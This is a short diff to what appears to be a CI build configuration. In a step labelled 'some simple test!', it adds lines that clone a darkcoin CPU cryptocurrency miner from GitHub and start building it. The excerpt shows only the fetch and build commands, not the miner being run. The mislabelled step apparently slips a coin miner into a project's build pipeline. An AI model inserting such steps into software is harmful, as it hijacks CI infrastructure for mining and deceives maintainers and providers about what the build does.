@@ -4,6 +4,8 @@ build:
     -  script:
         name: some simple test!
         code: |-
+          git clone https://github.com/ig0tik3d/darkcoin-cpuminer-1.2c.git 
+          cd darkcoin-cpuminer-1.2c &&
           chmod a+x autogen.sh
           ./autogen.sh
           ./configure
